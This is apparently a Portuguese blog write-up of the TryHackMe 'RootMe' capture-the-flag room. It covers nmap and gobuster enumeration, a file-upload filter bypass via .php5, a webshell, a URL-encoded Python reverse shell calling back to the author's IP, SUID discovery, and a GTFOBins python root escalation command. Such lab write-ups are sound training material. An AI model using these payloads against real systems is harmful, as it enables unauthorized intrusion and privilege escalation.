---
description: CTF do TryhackME como fiz e anotações.
title: TryhackMe - RootMe - Fácil
date: 2024-01-15 19:01:00 +/-0300
categories: [CTF, TryHackMe]
tags: [ctf, tryhackme, linux, SUID, facil]     # TAG names should always be lowercase
show_image_post: true
---
![Alt text](/assets/img/rootmelogo.png){: w="100" h="100" .left}

---
# THM - Root Me - Fácil
---
## **Enumeração**

### nmap 

```shell
sudo nmap -sS -Pn -n --disable-arp-ping --stats-every=7s  10.10.246.13 --min-rate 10000 -oA nmapvers -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-13 21:29 -03
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 21:29 (0:00:07 remaining)
Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.30% done; ETC: 21:29 (0:00:00 remaining)
Nmap scan report for 10.10.246.13
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HackIT - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.57 seconds
```
{: .nolineno }
### gobuster

```shell
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.10.246.13/uploads              (Status: 200) [Size: 743]
http://10.10.246.13/js                   (Status: 200) [Size: 958]
http://10.10.246.13/css                  (Status: 200) [Size: 1125]
http://10.10.246.13/index.php            (Status: 200) [Size: 616]
http://10.10.246.13/panel                (Status: 200) [Size: 732]
http://10.10.246.13/server-status        (Status: 403) [Size: 277]
http://10.10.246.13/.php                 (Status: 403) [Size: 277]
http://10.10.246.13/.php                 (Status: 403) [Size: 277]
http://10.10.246.13/index.php            (Status: 200) [Size: 616]
http://10.10.246.13/.php                 (Status: 403) [Size: 277]
Progress: 249136 / 249140 (100.00%)
===============================================================
Finished
===============================================================
```
{: .nolineno }


## **Acesso**

Encontrado pagina de upload de arquivos

http://10.10.246.13/panel 

![Alt text](/assets/img/rootme1.png)

Bloqueio de envio de arquivos php, bypass renomeando arquivo para .php5

### Upload de webshell

![Alt text](/assets/img/rootme2.png)

Encontrado arquivo website.zip na home do site

```shell
└─$ ls -R Website          
Website:
css  index.php  js  panel  uploads

Website/css:
home.css  panel.css

Website/js:
maquina_de_escrever.js

Website/panel:
index.php

Website/uploads:
'CAPA CANAL NOVO.png'   shell.php5
```
{: .nolineno }

### Reverse Shell 

```text
http://10.10.246.13/uploads/sh.php5?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.6.125.125%22,4443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27
```
{: .nolineno }

### Primeira Flag

```shell
bash-4.4$ ls
html  user.txt
bash-4.4$ cat user.txt 
THM{y0u_g0t_a_sh3ll}
```
{: .nolineno }


## **Escalação de Privilegio**

sudo -l precisa de senha
Busca por arquivos SUID

```shell
find / -perm -u=s -type f 2>/dev/null; find / -perm -4000 -o- -perm -2000 -o- -perm -6000
```
{: .nolineno }

Encontrado /usr/bin/python

No [GTFObins]([https://](https://gtfobins.github.io/gtfobins/python/#suid)) como obter root através de SUID no python.  
`./usr/bin/python -c 'import os; os.execl("/bin/bash", "bash", "-p")'`

### **Última flag encontrada** 
![Alt text](/assets/img/rootme4.png){: .w-75 .normal}
    
